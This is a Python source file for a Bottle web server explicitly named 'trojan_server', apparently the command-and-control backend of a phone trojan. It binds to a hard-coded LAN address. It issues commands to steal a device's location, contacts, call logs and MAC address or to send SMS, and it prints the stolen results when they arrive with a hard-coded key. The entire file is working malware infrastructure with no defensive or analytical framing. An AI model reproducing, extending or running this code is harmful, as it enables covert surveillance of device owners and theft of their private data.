import bottle
import sys
import time
import sys
import getopt
import argparse
import os
import signal
import json

KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'

class trojan_server:
	def __init__(self, host, port, args):
		self._host = host
		self._port = port
		self.args = args
		self.excludeargs = ['verbose']
		self.verbose = args.verbose
		self.nullaction = False
		self._app = bottle.Bottle()
		self._route()

	def start(self):
		self._app.run(host=self._host, port=self._port, quiet=self.verbose)

	def stop(self):
		os.kill(os.getpid(), signal.SIGKILL)

	def _route(self):
		self._app.route('/', method="GET", callback=self.default)
		self._app.route('/action', method="GET", callback=self.action)
		self._app.route('/result', method="POST", callback=self.result)

	def default(self):
		return "hello"

	def action(self):
		for arg, value in sorted(vars(self.args).items()):
			if value != False and self.nullaction != True and arg not in self.excludeargs:
				bottle.response.content_type = 'application/json'
				return json.dumps({arg: value})
		return "null"

	def result(self):
		result = bottle.request.POST['result']
		if str(bottle.request.POST['KEY']) == KEY:
			print(str(result))
		else:
			print("Wrong KEY")

		#print json.dumps(str(result), indent=4)
		self.nullaction = True
		self.stop()

class parse_arg:
	def __init__(self):
		self.parser = argparse.ArgumentParser(description='ACTION')
		self.parser.add_argument('--location', dest='location', action='store_true', default=False,
                   help='get Location')
		self.parser.add_argument('--contacts', dest='contacts', action='store_true', default=False,
                   help='get Contacts')
		self.parser.add_argument('--calllogs', dest='calllogs', action='store_true', default=False,
                   help='Get calllogs')
		self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
                   help='get Mac address')
		self.parser.add_argument('--sendsms', dest='sendsms', action='store', nargs='*', default=False,
                   help='Send SMS')
		self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_false', default=True,
                   help='verbose')

		self.args = self.parser.parse_args()

	def getargs(self):
		return self.args

if __name__ == '__main__':
	server = trojan_server(host='192.168.1.59', port=8080, args=parse_arg().getargs())
	server.start()